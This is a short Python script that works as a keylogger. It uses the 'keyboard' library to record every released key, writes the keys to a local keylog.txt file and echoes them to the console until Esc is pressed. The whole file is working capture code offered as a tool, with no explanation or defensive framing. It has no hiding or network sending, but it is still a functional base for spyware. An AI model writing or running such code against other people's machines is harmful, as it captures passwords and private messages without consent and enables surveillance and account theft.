import keyboard

# Path to the log file
log_file = "keylog.txt"

# Function to write keystrokes to the log file
def write_to_log(key):
    with open(log_file, "a") as f:
        f.write(key)

# Function to handle key events
def on_key_event(e):
    key = e.name
    if len(key) > 1:
        # Special keys (e.g., 'enter', 'shift', etc.)
        if key == "space":
            key = " "
        elif key == "enter":
            key = "\n"
        elif key == "decimal":
            key = "."
        else:
            key = f"[{key}]"
    write_to_log(key)
    print(key, end='', flush=True)  # Print to console without newline

# Main function to start the keylogger
def main():
    print("Keylogger started. Press 'Esc' to exit.")
    # Start the keylogger
    keyboard.on_release(on_key_event)
    keyboard.wait("esc")
    print("\nKeylogger stopped.")

if __name__ == "__main__":
    main()
